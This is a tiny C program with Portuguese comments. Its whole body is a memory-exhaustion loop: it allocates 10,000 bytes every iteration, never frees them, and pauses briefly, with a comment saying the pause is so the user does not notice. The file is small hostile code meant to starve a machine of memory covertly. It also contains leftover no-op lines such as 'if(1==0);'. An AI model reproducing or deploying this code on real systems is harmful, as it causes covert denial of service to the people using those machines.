#include <stdlib.h>
#include <stdio.h>

acao(){  // main secundaria, onde a magica acontece
	char *f;    //lotação de memoria 
	while(1){  
 f = malloc (10000); // lota a memoria com 10000 bytes a cada loop e deixa perdida. Impossivel de achar o endereço da mesma.
 usleep(10); // espera um tempo para que o usuario não perceba a ação do programa.
}
}
main(){  // main principal, onde mostrará a tela, enquando o programa é executado na main secundaria.
	int i;
	i = 2;
	if(1==0);
	acao();
	return 0;
}
